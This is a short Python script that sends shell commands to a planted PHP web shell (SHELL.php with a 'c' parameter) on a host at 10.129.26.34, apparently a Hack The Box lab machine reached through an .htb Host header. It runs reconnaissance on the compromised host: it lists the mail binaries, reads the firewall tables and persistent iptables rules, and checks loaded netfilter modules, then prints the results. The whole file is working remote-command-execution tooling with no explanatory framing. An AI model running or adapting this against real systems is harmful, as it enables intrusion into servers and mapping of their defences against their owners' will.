import urllib.request, urllib.parse

cmds = [
    "ls -la /usr/sbin/sendmail 2>&1",
    "ls -la /usr/sbin/postdrop 2>&1",
    "ls -la /usr/bin/mail 2>&1",
    # Check if we can see the firewall via /proc/net
    "cat /proc/net/ip_tables_names 2>&1",
    "cat /proc/net/ip6_tables_names 2>&1",
    "cat /proc/net/nf_tables 2>&1 | head -20",
    # Check what iptables modules are loaded
    "lsmod 2>&1 | grep -i xt_owner",
    "lsmod 2>&1 | grep -i ipt",
    "lsmod 2>&1 | grep -i nft",
    # Check for iptables persistent rules
    "find /etc -name \"*iptables*\" -o -name \"*nftables*\" 2>/dev/null | head -20",
    # Maybe look at the rules.v4 file
    "cat /etc/iptables/rules.v4 2>&1 | head -50",
    "cat /etc/iptables/rules.v6 2>&1 | head -50",
]

for cmd in cmds:
    url = "http://10.129.26.34/files/SHELL.php?" + urllib.parse.urlencode({"c": cmd})
    headers = {"Host": "support_001.enigma.htb"}
    req = urllib.request.Request(url, headers=headers)
    try:
        resp = urllib.request.urlopen(req, timeout=10)
        result = resp.read().decode("utf-8", errors="replace").strip()
        if result and "Permission denied" not in result:
            print(f"=== {cmd[:60]} ===")
            print(result[:2000])
            print()
    except Exception as e:
        pass
